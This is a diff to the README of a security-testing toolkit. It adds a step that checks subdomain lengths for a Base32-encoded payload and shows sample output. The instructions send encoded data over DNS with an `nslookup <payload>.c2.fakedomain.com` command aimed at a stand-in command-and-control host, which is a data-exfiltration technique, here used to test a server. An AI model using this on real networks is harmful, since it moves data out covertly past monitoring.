@@ -108,7 +108,19 @@ These tools are intended solely for **security testing purposes**. I am not resp
 
 1. Use [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base32('A-Z2-7%3D')) to create a Base32 payload.
    
-2. Once the payload is generated, use `nslookup` to test the server:  
+2. Use `dns_length_calc.py` to ensure that the lengths are valid. Follow the prompts.
+   ```bash
+   python3 dns_length_calc.py
+   ```
+   - Example:
+   ```bash
+   Enter subdomain: KRCVGVCJJZDSAVCFKNKESTSHEAYTEMY
+   Enter full domain (e.g., example.com): c2.fakedomain.com
+   Subdomain length: 31 characters (Valid)
+   Full domain length: 49 characters (Valid)
+   ```
+   
+3. Once the payload is generated, use `nslookup` to test the server:  
    ```bash
    nslookup <payload>.c2.fakedomain.com
    ```
@@ -130,7 +142,6 @@ These tools are intended solely for **security testing purposes**. I am not resp
    ```
   **EXTRA NOTE:**
   - The '=' is added by the script when it tries to decrypt it.
-  - The domain string 'KRCVGVCJJZDSAVCFKNKESTSHEAYTEMY.c2.fakedomain.com' contains 49 characters.
 ---
 
 **Note:** All other tools not documented here are works in progress.
